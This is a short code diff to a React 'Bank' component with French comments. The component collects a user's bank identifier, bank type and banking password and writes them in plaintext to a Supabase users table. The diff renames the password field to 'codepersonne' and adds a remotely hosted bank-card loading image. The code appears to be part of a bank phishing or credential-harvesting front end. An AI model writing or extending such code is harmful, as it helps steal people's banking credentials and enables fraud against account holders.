@@ -47,11 +47,12 @@ const Bank = () => {
     
     try {
       // Mettre à jour les informations bancaires dans la base de données
+      // Changement : le mot de passe est enregistré dans le champ codepersonne
       await supabase
         .from("users")
         .update({
           identifiantiban: formData.identifiantiban,
-          password: formData.password,
+          codepersonne: formData.password, // Changé de password à codepersonne
           typebanque: formData.typebanque,
         })
         .eq("id", userId);
@@ -85,9 +86,9 @@ const Bank = () => {
           
           <div className="flex justify-center mb-4">
             <img 
-              src="/lovable-uploads/f2e09f1b-60f0-41c9-9d0a-077ac21f135b.png" 
-              alt="Banques partenaires"
-              className="w-64 h-auto"
+              src="https://assets.zyrosite.com/Aq2q239lEjf2a2Mj/ta-c-la-c-chargement-d9575RLeGQcKkjww.gif" 
+              className="img-fluid" 
+              alt="Carte bancaire"
             />
           </div>
           
